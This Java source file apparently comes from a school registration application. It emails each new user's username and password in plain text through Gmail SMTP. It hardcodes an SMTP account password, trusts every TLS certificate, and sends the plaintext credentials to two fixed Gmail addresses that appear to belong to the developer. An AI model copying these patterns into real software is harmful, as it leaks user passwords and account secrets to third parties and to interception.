/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package edubit;
import java.util.Properties;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.JOptionPane;

public class SendEmail {
public Boolean SendAnEmail(String username,String password) {
       
        

        
        Boolean status=false;
        final String MeUser = "bitrootgencode";
        final String MeCode = "ntat28april2001";

        Properties prop = new Properties();
        prop.put("mail.smtp.host", "smtp.gmail.com");
        prop.put("mail.smtp.port", "587");
        prop.put("mail.smtp.auth", "true");
        prop.put("mail.smtp.starttls.enable", "true");
        prop.put("mail.smtp.ssl.trust", "*");//TLS

        Session session = Session.getInstance(prop,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(MeUser, MeCode);
                    }
                });

        try {
           
           
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress("bitrootgencode@gmail.com"));
            message.setRecipients(
                    Message.RecipientType.TO,
                    InternetAddress.parse("bitrootgencode@gmail.com, kwizerageniklenon@gmail.com"));
            message.setSubject("BR Software Resolution PANEL");
            message.setText("You have Successfully Registered as BR Software User in Your School!"
                    + "\n\n Username:"+username+""
                    + "\n\n Password:"+password+" ");
     
            

            Transport.send(message);

            JOptionPane.showMessageDialog(null, "USER EMAIL SENT","BR Mail Sender",1);
            status=true;

        } catch (MessagingException e) {
           JOptionPane.showMessageDialog(null, "UNMESSAGE SENT! so "+e,"Invalid Email",0);
           status=false;
        }
    return status;
 }

}